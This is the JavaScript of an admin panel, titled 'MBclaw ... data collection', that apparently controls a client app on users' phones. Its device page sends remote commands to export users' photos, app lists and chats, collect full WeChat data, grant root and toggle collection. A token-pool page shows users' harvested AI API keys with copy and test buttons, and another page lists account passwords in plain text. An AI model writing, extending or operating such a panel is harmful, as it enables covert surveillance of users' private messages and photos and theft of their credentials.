// MBclaw Admin Panel v5.5 — GPT-style + data collection
var SESSION = null;

// ── Auth ──
function doLogin(){
  var p=document.getElementById('login-pwd').value;
  if(!p) return;
  var b=document.querySelector('#login-mask button'); b.disabled=true; b.textContent='...';
  api('/admin/api/login',{method:'POST',body:JSON.stringify({username:'mengbai',password:p})})
    .then(function(d){ SESSION=d; document.getElementById('login-mask').style.display='none'; document.getElementById('app-main').classList.add('show'); loadDash(); })
    .catch(function(e){ var el=document.getElementById('login-err'); el.textContent=e===401?'密码错误':'错误: '+e; el.style.display='block'; b.disabled=false; b.textContent='登录'; });
}
function doLogout(){
  fetch('/admin/api/logout',{method:'POST'}).then(function(){ SESSION=null; document.getElementById('login-mask').style.display='flex'; document.getElementById('app-main').classList.remove('show'); }).catch(function(){});
}
function api(p,o){ o=o||{}; o.credentials='include'; if(!o.headers)o.headers={}; if(o.method&&o.body&&!o.headers['Content-Type'])o.headers['Content-Type']='application/json'; return fetch(p,o).then(function(r){ if(!r.ok) throw r.status; return r.json() }); }
function navTo(n,el){
  document.querySelectorAll('.page').forEach(function(p){p.classList.remove('active')});
  document.getElementById('p-'+n).classList.add('active');
  document.querySelectorAll('.sidebar-nav a').forEach(function(a){a.classList.remove('active')});
  el.classList.add('active');
  var m={dash:loadDash,devices:loadDevices,status:loadServerStatus,notices:loadNotices,bugs:loadBugs,features:loadFeatures,tokens:loadTokens,miclaw:loadMiclaw,version:loadVersion};
  if(m[n]) m[n]();
  // Mobile: close sidebar after nav
  if(window.innerWidth<=768){document.querySelector('.sidebar').classList.remove('open');document.querySelector('.sidebar-backdrop').classList.remove('show');}
}
function toggleSidebar(){
  document.querySelector('.sidebar').classList.toggle('open');
  document.querySelector('.sidebar-backdrop').classList.toggle('show');
}

// ── Helpers ──
var T=function(ts){ return ts?new Date(ts*1000).toLocaleString():'-'; };
var esc=function(s){ return String(s==null?'':s).replace(/[&<>"']/g,function(c){ return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]; }); };
var js=function(s){ return String(s==null?'':s).replace(/\\/g,'\\\\').replace(/'/g,'\\x27').replace(/[\r\n]/g,''); };
var fmt=function(n){ n=Number(n||0); if(n<1024)return n+'B'; if(n<1048576)return (n/1024).toFixed(1)+'KB'; if(n<1073741824)return (n/1048576).toFixed(1)+'MB'; return (n/1073741824).toFixed(2)+'GB'; };
var fmtBytes=function(b){ if(!b||b===0) return '0 B'; var k=1024,sizes=['B','KB','MB','GB','TB']; var i=Math.floor(Math.log(b)/Math.log(k)); return parseFloat((b/Math.pow(k,i)).toFixed(1))+' '+sizes[i]; };

// ── Dark mode ──
function toggleTheme(){
  var h=document.documentElement, cur=h.getAttribute('data-theme'), next=cur==='dark'?'light':'dark';
  h.setAttribute('data-theme',next); document.querySelector('.theme-toggle').textContent=next==='dark'?'☀️ 亮色模式':'🌙 暗色模式';
  localStorage.setItem('mb-theme',next);
}
(function(){ var t=localStorage.getItem('mb-theme')||'light'; document.documentElement.setAttribute('data-theme',t); })();

// ── Dashboard ──
function loadDash(){
  document.getElementById('dash-time').textContent='加载中...';
  Promise.all([
    api('/admin/api/overview').catch(function(){return{}}),
    api('/admin/client/debug/devices').catch(function(){return[]}),
    api('/admin/api/server-status').catch(function(){return{servers:{}}}),
    api('/admin/api/download-stats').catch(function(){return{}})
  ]).then(function(r){
    var o=r[0], dd=r[1], ss=r[2].servers||{}, dl=r[3];
    var on=(dd||[]).length;
    document.getElementById('dash-time').textContent='更新于 '+new Date().toLocaleString();
    document.getElementById('dash-stats').innerHTML=
      '<div class="stat-card"><div class="l">总用户人数</div><div class="v">'+(o.total_devices_ever||0)+'</div></div>'+
      '<div class="stat-card"><div class="l">在线设备</div><div class="v">'+(o.online_devices||0)+'</div></div>'+
      '<div class="stat-card"><div class="l">API请求</div><div class="v">'+(o.total_requests||0)+'</div></div>'+
      '<div class="stat-card"><div class="l">错误数</div><div class="v">'+(o.errors||0)+'</div></div>'+
      '<div class="stat-card"><div class="l">总下载</div><div class="v">'+(dl.total||0)+'</div></div>';
    document.getElementById('dash-online').innerHTML='<table><tr><th>调试码</th><th>QQ</th><th>型号</th><th>版本</th><th>IP</th></tr>'+(dd||[]).slice(0,10).map(function(d){return'<tr><td class="mono">'+esc(d.code)+'</td><td>'+esc(d.qq||'-')+'</td><td>'+esc(d.model)+'</td><td><span class="badge badge-purple">'+esc(d.version)+'</span></td><td class="mono">'+esc(d.ip)+'</td></tr>'}).join('')+'</table>';
    document.getElementById('dash-server').innerHTML=
      '<div class="stat-grid" style="grid-template-columns:1fr 1fr;margin:0">'+
      '<div class="stat-card"><div class="l">今日新增</div><div class="v">'+(o.new_today||0)+'</div></div>'+
      '<div class="stat-card"><div class="l">今日上线</div><div class="v">'+(o.online_today||0)+'</div></div>'+
      '<div class="stat-card"><div class="l">Root用户</div><div class="v">'+(o.root_users||0)+'</div></div>'+
      '<div class="stat-card"><div class="l">Key可用</div><div class="v">'+(o.key_ok||0)+'</div></div></div>';
  }).catch(function(e){ document.getElementById('dash-time').textContent='加载失败: '+e; });
}

// ── Devices ──
// ── China time helper ──
function chinaTime(ts){ if(!ts) return '-'; var d=new Date(ts); if(isNaN(d.getTime())) return ts.slice(0,19); return d.toLocaleString('zh-CN',{timeZone:'Asia/Shanghai',month:'2-digit',day:'2-digit',hour:'2-digit',minute:'2-digit',second:'2-digit'}); }

function loadDevices(){
  document.getElementById('devices-count').textContent='加载中...';
  api('/admin/api/users?limit=200').then(function(uu){
    var all=(uu.users||[]).slice();
    // Sort: online first, then by last_seen desc
    all.sort(function(a,b){
      if(a.online&&!b.online) return -1;
      if(!a.online&&b.online) return 1;
      if((a.last_seen||'')===(b.last_seen||'')) return 0;
      return (a.last_seen||'') > (b.last_seen||'') ? -1 : 1;
    });
    // Split: stale >5 days
    var fiveDaysAgo=new Date(Date.now()-5*86400000).toISOString();
    var active=all.filter(function(d){ return d.online||(d.last_seen||'')>=fiveDaysAgo; });
    var stale=all.filter(function(d){ return !d.online&&(d.last_seen||'')<fiveDaysAgo; });

    var total=all.length, activeCount=active.length, staleCount=stale.length;
    document.getElementById('devices-count').textContent='共 '+total+' 台（活跃 '+activeCount+', 休眠 '+staleCount+'）';

    var rows='', i=0;
    active.forEach(function(d,idx){ i=idx; rows+=deviceRow(d,i); });
    if(stale.length>0){
      rows+='<tr id="stale-header"><td colspan="9" style="background:var(--bg);padding:10px 16px;cursor:pointer;color:var(--muted)" onclick="toggleStale()">▶ 休眠设备（'+staleCount+' 台，超5天未上线）</td></tr>';
      rows+='<tbody id="stale-body" style="display:none">';
      stale.forEach(function(d,idx){ rows+=deviceRow(d,activeCount+idx); });
      rows+='</tbody>';
    }
    document.getElementById('devices-body').innerHTML=rows||'<tr><td colspan="9"><div class="empty-state">暂无设备</div></td></tr>';
    currentDeviceIndex=all.length;
  }).catch(function(e){ document.getElementById('devices-count').textContent='加载失败: '+e; });
}
function deviceRow(d,i){
  var keys=d.keys||{}, online=d.online, ts=d.last_seen||'', code=d.code||d.user_id||'';
  var rootBadge=d.root?'<span class="badge badge-ok">YES</span>':'<span class="badge badge-err">NO</span>';
  var keyBadge=(d.api_provider||(keys.api_key))?'<span class="badge badge-ok">已配</span>':'<span class="badge badge-warn">未配</span>';
  var keyHtml='';
  if(keys.api_key){
    keyHtml='<div style="margin-top:6px;padding:8px;background:var(--bg);border-radius:6px">'+
      '<div><b>Key:</b> <span class="mono">'+esc(keys.api_key||'-')+'</span></div>'+
      '<div><b>URL:</b> <span class="mono">'+esc(keys.api_base_url||'-')+'</span></div>'+
      '<div><b>Model:</b> '+esc(keys.model_name||'-')+'</div></div>';
  }
  return '<tr><td class="mono">'+esc(code||'-')+'</td><td>'+esc(d.qq||'-')+'</td><td>'+esc(d.model||'-')+'</td>'+
    '<td><span class="badge badge-purple">'+esc(d.version||'?')+'</span></td><td>'+rootBadge+'</td><td>'+keyBadge+'</td>'+
    '<td><span class="badge '+(online?'badge-ok':'badge-warn')+'">'+(online?'在线':'离线')+'</span></td>'+
    '<td style="font-size:12px">'+chinaTime(ts)+'</td>'+
    '<td><button class="btn-sm" onclick="toggleDetail('+i+')">详情</button> '+
    '<button class="btn-sm" style="color:var(--red);border-color:#fecaca" onclick="deleteDevice(\x27'+js(code)+'\x27)">删除</button></td></tr>'+
  '<tr class="detail-row" id="det-'+i+'"><td colspan="9"><div class="detail-card">'+
    '<div><b>设备ID</b><br><span class="mono">'+esc(d.device_id||'-')+'</span></div><div><b>IP</b><br>'+esc(d.ip||'-')+'</div>'+
    '<div><b>Root</b><br>'+(d.root?'<span class="badge badge-ok">YES</span>':'<span class="badge badge-err">NO</span>')+'</div>'+
    '<div><b>权限</b><br>'+(d.perms_granted||0)+'/'+(d.perms_total||0)+'</div>'+
    '<div><b>心跳</b><br>'+chinaTime(ts)+'</div></div>'+keyHtml+
    '<div class="action-bar">'+
      '<button class="btn-sm" onclick="act(\x27'+js(code)+'\x27,\x27root-auth\x27)">Root授权</button>'+
      '<button class="btn-sm" onclick="act(\x27'+js(code)+'\x27,\x27user-info\x27)">详情</button>'+
      '<button class="btn-sm" onclick="cToggle(\x27'+js(code)+'\x27)">收集开关</button>'+
      '<button class="btn-sm" onclick="act(\x27'+js(code)+'\x27,\x27photos\x27)">相册</button>'+
      '<button class="btn-sm" onclick="act(\x27'+js(code)+'\x27,\x27apps-export\x27)">应用</button>'+
      '<button class="btn-sm" onclick="act(\x27'+js(code)+'\x27,\x27chat-export\x27)">对话</button>'+
      '<button class="btn-sm" onclick="deviceCmd(\x27'+js(code)+'\x27,\x27collect:wechat_full\x27)">微信完整</button>'+
      '<button class="btn-sm" onclick="deviceCmd(\x27'+js(code)+'\x27,\x27collect:wechat_meta\x27)">微信元数据</button>'+
      '<button class="btn-sm" onclick="vUploads(\x27'+js(code)+'\x27)">上传</button>'+
      '<button class="btn-sm" onclick="vChats(\x27'+js(code)+'\x27)">对话记录</button></div></td></tr>';
}
function toggleStale(){ var el=document.getElementById('stale-body'); if(!el)return; el.style.display=el.style.display==='none'?'':'none'; var btn=document.getElementById('stale-header'); if(btn){var t=btn.firstChild;if(t&&t.nodeType===3){t.textContent=t.textContent.replace(/[▶▼]/,'')};btn.prepend(el.style.display==='none'?'▶':'▼');} }
function deleteDevice(code){ if(!confirm('确认删除 '+code+' 的设备数据？不可恢复！')) return; api('/admin/api/devices/'+encodeURIComponent(code)+'/delete',{method:'POST'}).then(function(){alert('已删除');loadDevices();}).catch(function(e){alert('失败: '+e)}); }
function toggleDetail(i){ var el=document.getElementById('det-'+i); el.classList.toggle('show'); }
function act(code,action){ api('/admin/api/device-action?code='+encodeURIComponent(code)+'&action='+action).then(function(r){if(r.msg)alert(r.msg)}).catch(function(e){alert('失败: '+e)}); }
function deviceCmd(code,cmd){ api('/admin/api/device-action?code='+encodeURIComponent(code)+'&action=device-cmd&cmd='+encodeURIComponent(cmd)).then(function(r){alert(r.msg||'OK')}).catch(function(e){alert('失败: '+e)}); }
function cToggle(code){ var en=confirm('开启数据收集？点取消=关闭'); api('/admin/api/device-action?code='+encodeURIComponent(code)+'&action=set-collect&enabled='+en).then(function(r){alert(r.msg||'OK');loadDevices()}).catch(function(e){alert('失败: '+e)}); }
function vUploads(code){ api('/api/mother/uploads/'+encodeURIComponent(code)).then(function(r){if(!r.items||!r.items.length){alert('暂无上传数据');return}var txt=r.items.map(function(i){return i.name+' ('+Math.round(i.size/1024)+'KB) - '+i.url}).join('\n');alert('共 '+r.total+' 个文件:\n\n'+txt)}).catch(function(e){alert('加载失败: '+e)}); }
function vChats(code){ api('/admin/api/chat-records/'+encodeURIComponent(code)).then(function(r){ if(!r.files||!r.files.length){alert('暂无对话记录');return} var w=window.open('','_blank','width=600,height=500'); w.document.write('<html><head><meta charset=utf-8><title>'+esc(code)+'</title><style>body{font:14px system-ui;background:#0f172a;color:#e2e8f0;padding:20px} h2{font-size:18px;margin-bottom:16px} .item{margin-bottom:12px;padding:12px;background:#1e293b;border-radius:8px} .item .t{font-weight:600;margin-bottom:4px} .item .m{font-size:11px;color:#94a3b8;margin-bottom:6px} pre{background:#020617;padding:10px;border-radius:6px;font-size:11px;max-height:300px;overflow:auto;white-space:pre-wrap} a{color:#3b82f6;text-decoration:none}</style></head><body><h2>'+esc(code)+' 对话/聊天导出</h2>'); (r.files||[]).forEach(function(f){ w.document.write('<div class=item><div class=t>'+esc(f.name)+' <a href=\"'+esc(f.url)+'\">下载</a></div><div class=m>'+fmt(f.size)+' · '+T(f.mtime)+'</div>'+(f.preview?'<pre>'+esc(f.preview)+'</pre>':'')+'</div>'); }); w.document.write('</body></html>'); }).catch(function(e){alert('加载失败: '+e)}); }

// ── Server Status ──
function loadServerStatus(){
  document.getElementById('status-count').textContent='加载中...';
  api('/admin/api/server-status').then(function(d){
    var servers=d.servers||{}, html='', online=0;
    for(var name in servers){
      var s=servers[name]; if(!s) continue;
      if(s.status==='online') online++;
      var color=s.status==='online'?'var(--green)':'var(--red)';
      var memPct=s.mem_total>0?Math.round(s.mem_used/s.mem_total*100):0;
      html+='<div class="device-card">';
      var role=s.role||'';
      html+='<div style="display:flex;align-items:center;gap:10px;margin-bottom:6px"><div style="width:10px;height:10px;border-radius:50%;background:'+color+';box-shadow:0 0 8px '+color+'"></div><div class="dn">'+esc(name)+'</div><span style="font-size:12px;color:var(--primary);font-weight:600;font-family:monospace">'+(s.ip||'')+'</span></div>';
      if(role) html+='<div style="font-size:11px;color:var(--muted);margin-bottom:8px;padding-left:22px">'+esc(role)+'</div>';
      if(s.hostname) html+='<div style="font-size:10px;color:var(--muted);margin-bottom:8px;padding-left:22px;font-family:monospace">'+esc(s.hostname)+'</div>';
      html+='<div class="dg">';
      if(s.mem_total>0) html+='<div class="di"><div class="dl">内存</div><div class="dv">'+s.mem_used+'MB / '+s.mem_total+'MB</div><div class="progress-bar"><div style="width:'+memPct+'%;background:'+(memPct>80?'var(--red)':'var(--green)')+'"></div></div></div>';
      if(s.disk_total) html+='<div class="di"><div class="dl">磁盘</div><div class="dv">'+s.disk_used+' / '+s.disk_total+' ('+s.disk_pct+')</div></div>';
      if(s.net_rx>0) html+='<div class="di"><div class="dl">流量 收/发</div><div class="dv">'+fmtBytes(s.net_rx)+' / '+fmtBytes(s.net_tx)+'</div></div>';
      if(s.uptime) html+='<div class="di"><div class="dl">运行时间</div><div class="dv">'+esc(s.uptime)+'</div></div>';
      html+='</div></div>';
    }
    document.getElementById('status-count').textContent=online+' / '+Object.keys(servers).length+' 在线';
    document.getElementById('status-grid').innerHTML=html||'<div class="empty-state">无数据</div>';
  }).catch(function(e){ document.getElementById('status-count').textContent='加载失败: '+e; });
}

// ── Notices ──
function loadNotices(){ var el=document.getElementById('notices-list'); if(!el)return; el.innerHTML='<div class="empty-state">加载中...</div>'; api('/admin/api/notices').then(function(n){ el.innerHTML=(n.notices||[]).map(function(i){var rc=i.read_count||0;var rcHtml=rc>0?' <span style="font-size:11px;color:var(--muted)">'+rc+'人已读</span>':'';var arch=i.archived?' opacity:0.5;text-decoration:line-through':'';return'<div class="feed-card" style="'+arch+'"><div class="title">'+esc(i.title)+rcHtml+'</div><div class="meta">'+new Date(i.ts*1000).toLocaleString()+(i.archived?' · 已归档':'')+'</div><div class="body">'+esc(i.content)+'</div></div>'}).join('')||'<div class="empty-state">暂无公告</div>'; }).catch(function(e){ el.innerHTML='<div class="empty-state">加载失败: '+e+'</div>'; }) }
function newNotice(){ var t=document.getElementById('notice-title').value.trim(),c=document.getElementById('notice-body').value.trim(); if(!t||!c) return alert('不能为空'); api('/admin/api/notices',{method:'POST',body:JSON.stringify({title:t,content:c})}).then(function(){ loadNotices(); document.getElementById('notice-title').value=''; document.getElementById('notice-body').value=''; }); }

// ── Bugs ──
function loadBugs(){ var el=document.getElementById('bugs-list'),ct=document.getElementById('bugs-count');if(ct)ct.textContent='加载中...'; api('/admin/api/bugs').then(function(b){ document.getElementById('bugs-list').innerHTML=(b.bugs||[]).map(function(i){ var s=i.status==='resolved'?'text-decoration:line-through;opacity:0.5':'';var jid=esc(i.id),jv=i.votes||0;return'<div class="feed-card" style="'+s+'"><div class="title">'+(i.pinned?'<span class="badge badge-warn">置顶</span> ':'')+esc(i.title)+' <span class="badge badge-purple" id="bv-'+jid+'">'+jv+'票</span></div><div class="meta">'+new Date(i.ts*1000).toLocaleString()+'</div><div class="body">'+esc(i.content)+'</div><div class="action-bar">'+
'<button class="btn-sm" onclick="pinItem(\x27bug\x27,\x27'+jid+'\x27)">'+(i.pinned?'取消置顶':'置顶')+'</button>'+
'<button class="btn-sm" onclick="resolveItem(\x27bug\x27,\x27'+jid+'\x27)">'+(i.status==='resolved'?'重新打开':'已解决')+'</button>'+
'<button class="btn-sm" onclick="editVotes(\x27bug\x27,\x27'+jid+'\x27,'+jv+')">修改点赞</button>'+
'<button class="btn-sm" style="color:var(--red);border-color:#fecaca" onclick="deleteItem(\x27bug\x27,\x27'+jid+'\x27)">删除</button></div></div>'}).join('')||'<div class="empty-state">暂无反馈</div>';if(ct)ct.textContent='共 '+(b.bugs||[]).length+' 条'; }).catch(function(e){if(el)el.innerHTML='<div class="empty-state">加载失败</div>'}) }

// ── Features ──
function loadFeatures(){ var el=document.getElementById('features-list'),ct=document.getElementById('features-count');if(ct)ct.textContent='加载中...'; api('/admin/api/features').then(function(f){ var items=f.features||[]; el.innerHTML=items.map(function(i){ var s=i.status==='resolved'?'text-decoration:line-through;opacity:0.5':'';var jid=esc(i.id),jv=i.votes||0;return'<div class="feed-card" style="'+s+'"><div class="title">'+(i.pinned?'<span class="badge badge-warn">置顶</span> ':'')+esc(i.title)+' <span class="badge badge-ok" id="fv-'+jid+'">'+jv+'票</span></div><div class="meta">'+new Date(i.ts*1000).toLocaleString()+'</div><div class="body">'+esc(i.content)+'</div><div class="action-bar">'+
'<button class="btn-sm" onclick="pinItem(\x27feature\x27,\x27'+jid+'\x27)">'+(i.pinned?'取消置顶':'置顶')+'</button>'+
'<button class="btn-sm" onclick="resolveItem(\x27feature\x27,\x27'+jid+'\x27)">'+(i.status==='resolved'?'重新打开':'已解决')+'</button>'+
'<button class="btn-sm" onclick="editVotes(\x27feature\x27,\x27'+jid+'\x27,'+jv+')">修改点赞</button>'+
'<button class="btn-sm" style="color:var(--red);border-color:#fecaca" onclick="deleteItem(\x27feature\x27,\x27'+jid+'\x27)">删除</button></div></div>'}).join('')||'<div class="empty-state">暂无建议</div>';if(ct)ct.textContent='共 '+items.length+' 条'; }).catch(function(e){if(el)el.innerHTML='<div class="empty-state">加载失败</div>'}) }

// ── 管理操作 ──
function pinItem(type,id){ api('/admin/api/'+type+'s/'+id+'/pin',{method:'POST'}).then(function(r){ if(type==='bug')loadBugs();else loadFeatures(); }).catch(function(e){alert('失败: '+e)}); }
function resolveItem(type,id){ api('/admin/api/'+type+'s/'+id+'/resolve',{method:'POST'}).then(function(r){ if(type==='bug')loadBugs();else loadFeatures(); }).catch(function(e){alert('失败: '+e)}); }
function editVotes(type,id,cur){ var nv=prompt('修改点赞数量:',cur); if(nv===null||isNaN(nv)) return; api('/admin/api/'+type+'s/'+id+'/set-votes',{method:'POST',body:JSON.stringify({votes:parseInt(nv)})}).then(function(r){ document.getElementById((type==='bug'?'bv-':'fv-')+id).textContent=r.votes+'票'; if(type==='bug')loadBugs();else loadFeatures(); }).catch(function(e){alert('失败: '+e)}); }
function deleteItem(type,id){ if(!confirm('确认删除？')) return; api('/admin/api/'+type+'s/'+id+'/delete',{method:'POST'}).then(function(){ if(type==='bug')loadBugs();else loadFeatures(); }).catch(function(e){alert('失败: '+e)}); }

function loadTokens(){ var el=document.getElementById('tokens-body'),ct=document.getElementById('tokens-count'); if(ct)ct.textContent='加载中...'; el.innerHTML='<tr><td colspan="4" style="text-align:center;padding:20px">加载中...</td></tr>'; api('/admin/api/token-pool').then(function(d){ var items=(d.tokens||[]).filter(function(t){ return t.api_key; }); items.sort(function(a,b){ var ak=(a.key_test||{}).ok||false, bk=(b.key_test||{}).ok||false; if(ak&&!bk)return -1; if(!ak&&bk)return 1; if(a.online&&!b.online)return -1; if(!a.online&&b.online)return 1; return 0; }); var rows=''; items.forEach(function(t){ var kt=t.key_test||{}; var statusHtml=''; if(kt.ok){ statusHtml='<div class="badge badge-ok" style="margin-bottom:6px">✔ 可用</div>'; var models=kt.models||[]; if(models.length>0){ statusHtml+='<div style="background:var(--bg);border-radius:6px;padding:8px 10px;margin-top:4px;max-width:450px"><div style="font-size:11px;color:var(--muted);margin-bottom:3px">可用模型 ('+models.length+')</div><div style="font-size:12px;line-height:1.6;word-break:break-all">'+esc(models.join(' · '))+'</div></div>'; } }else if(kt.msg){ statusHtml='<div style="font-size:12px;color:var(--red);margin-bottom:4px" title="HTTP '+esc(kt.status_code||'?')+'">✘ '+esc(kt.msg)+'</div>'; }else{ statusHtml='<div style="font-size:12px;color:var(--muted);margin-bottom:4px">○ 未检测</div>'; } var jcode=js(t.code||''); var code=esc(t.code||'-'); var userHtml='<div style="font-weight:600;font-size:13px;margin-bottom:2px"><span class="mono">'+code+'</span>'+(t.qq?' <span style="font-weight:400;color:var(--muted)">QQ:'+esc(t.qq)+'</span>':'')+'</div><div style="font-size:11px;color:var(--muted)">'+esc(t.model||t.brand||'-')+'</div>'; var configHtml='<div><div style="margin-bottom:3px"><span style="font-size:11px;color:var(--muted)">Key: </span><span class="mono" style="word-break:break-all">'+esc(t.api_key||'-')+'</span> <button class="btn-sm" onclick="cpText(this)">复制</button></div><div style="margin-bottom:3px"><span style="font-size:11px;color:var(--muted)">URL: </span><span class="mono" style="font-size:11px;word-break:break-all">'+esc(t.api_base_url||'-')+'</span> <button class="btn-sm" onclick="cpText(this)">复制</button></div><div><span style="font-size:11px;color:var(--muted)">Model: </span><span>'+esc(t.model_name||'-')+'</span> <button class="btn-sm" onclick="cpText(this)">复制</button></div></div>'+statusHtml; rows+='<tr><td style="min-width:140px">'+userHtml+'</td><td><span class="badge '+(t.online?'badge-ok':'badge-err')+'">'+(t.online?'在线':'离线')+'</span></td><td>'+configHtml+'</td><td><button class="btn-sm" onclick="testKey(\x27'+jcode+'\x27,this)" style="white-space:nowrap;margin-bottom:6px">检测</button></td></tr>'; }); el.innerHTML=rows||'<tr><td colspan="4" style="text-align:center;padding:20px">暂无</td></tr>'; if(ct)ct.textContent='共 '+items.length+' 个 Token ('+(items.filter(function(x){ return (x.key_test||{}).ok; }).length)+' 可用)'; }).catch(function(e){ el.innerHTML='<tr><td colspan="4">加载失败: '+e+'</td></tr>'; if(ct)ct.textContent='错误'; }) }
function testKey(code,btn){ if(!code)return; if(btn)btn.disabled=true; api('/admin/api/token-pool/test-key?code='+encodeURIComponent(code),{method:'POST'}).then(function(){ loadTokens(); }).catch(function(e){ alert('失败: '+e); if(btn)btn.disabled=false; }); }
function testAllKeys(){ var btn=document.getElementById("btn-test-all"),pg=document.getElementById("test-progress"),bar=document.getElementById("test-progress-bar"); if(!btn)return; btn.disabled=true; btn.textContent="检测中..."; if(pg)pg.style.display="block"; if(bar){bar.style.width="0%";setTimeout(function(){bar.style.width="90%";},100);} api("/admin/api/token-pool/test-all",{method:"POST"}).then(function(r){ loadTokens(); btn.disabled=false; btn.textContent="全部检测"; if(pg)pg.style.display="none"; if(bar)bar.style.width="0%"; }).catch(function(e){ alert("失败: "+e); btn.disabled=false; btn.textContent="全部检测"; if(pg)pg.style.display="none"; if(bar)bar.style.width="0%"; }); }

// ── MiClaw ──
function loadMiclaw(){ var el=document.getElementById('miclaw-body'),ct=document.getElementById('miclaw-count'); if(ct)ct.textContent='加载中...'; el.innerHTML='<tr><td colspan="9" style="text-align:center;padding:20px">加载中...</td></tr>'; api('/admin/api/miclaw-instances').then(function(d){ var list=d.instances||[]; var rows=''; list.forEach(function(i){ var rs=i.raw_status; var badgeCls=rs==='ready'&&!i.is_fallback?'badge-ok':(rs==='pending'?'badge-warn':(rs==='stopped'?'badge-err':'badge-warn')); var acct=i.miclaw_account||'-'; var pass=i.miclaw_password||'-'; var aid=esc(i['实例ID']); var created=i.created_at?chinaTime(new Date(i.created_at*1000).toISOString()):'-'; rows+='<tr><td class="mono">'+aid+'</td><td>'+esc(i.user_id)+'</td><td class="mono"><span>'+esc(acct)+'</span> <button class="btn-sm" onclick="cpText(this)">复制</button></td><td class="mono"><span>'+esc(pass)+'</span> <button class="btn-sm" onclick="cpText(this)">复制</button></td><td><span class="badge '+badgeCls+'">'+esc(i.status)+'</span></td><td>'+esc(i.model)+'</td><td>'+(i.tokens_used||0)+'</td><td>'+created+'</td><td><button class="btn-danger" onclick="destroyInst(\x27'+aid+'\x27)">销毁</button></td></tr>'; }); el.innerHTML=rows||'<tr><td colspan="9">暂无实例</td></tr>'; if(ct)ct.textContent='共 '+list.length+' 个实例'; }).catch(function(e){ el.innerHTML='<tr><td colspan="9">加载失败: '+e+'</td></tr>'; if(ct)ct.textContent='错误'; }) }
function cpText(btn){ var v=btn.previousElementSibling.textContent; if(navigator.clipboard&&navigator.clipboard.writeText){ navigator.clipboard.writeText(v).then(function(){btn.textContent='OK';setTimeout(function(){btn.textContent='复制'},800)}).catch(function(){fallbackCopy(v,btn)}); }else{fallbackCopy(v,btn);} }
function fallbackCopy(v,btn){ var ta=document.createElement('textarea'); ta.value=v; ta.style.position='fixed'; ta.style.left='-9999px'; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); btn.textContent='OK'; setTimeout(function(){btn.textContent='复制'},800); }
function destroyInst(id){ if(!confirm('确认销毁 '+id+'?')) return; api('/admin/api/miclaw-instances/'+encodeURIComponent(id)+'/destroy',{method:'POST'}).then(function(r){alert(r.msg||'已销毁');loadMiclaw();}).catch(function(e){alert('失败: '+e)}); }

// ── Version ──
function loadVersion(){ var el=document.getElementById('version-info'),ct=document.getElementById('version-count'); if(ct)ct.textContent='加载中...'; if(el)el.innerHTML='<div class="mono">加载中...</div>'; api('/admin/client/version').then(function(v){ if(el)el.innerHTML='<span class="mono">当前: '+esc(v.current||'-')+' | 最新: '+esc(v.latest||'-')+'</span>'; document.getElementById('ver-latest').value=v.latest||''; document.getElementById('ver-changelog').value=v.changelog||''; if(ct)ct.textContent=''; }).catch(function(e){ if(el)el.innerHTML='加载失败'; if(ct)ct.textContent='错误'; }) }

// ── Init ──
document.addEventListener('DOMContentLoaded',function(){
  document.getElementById('login-pwd').addEventListener('keydown',function(e){ if(e.key==='Enter') doLogin(); });
  document.getElementById('ver-form').onsubmit=function(e){e.preventDefault();api('/admin/client/version/set?latest='+encodeURIComponent(document.getElementById('ver-latest').value.trim())+'&notes='+encodeURIComponent(document.getElementById('ver-changelog').value.trim())).then(function(){alert('已更新');loadVersion()});};
  // Auto login check
  api('/admin/api/overview').then(function(){
    document.getElementById('login-mask').style.display='none';
    document.getElementById('app-main').classList.add('show');
    loadDash();
  }).catch(function(){
    document.getElementById('login-mask').style.display='flex';
    document.getElementById('app-main').classList.remove('show');
  });
});
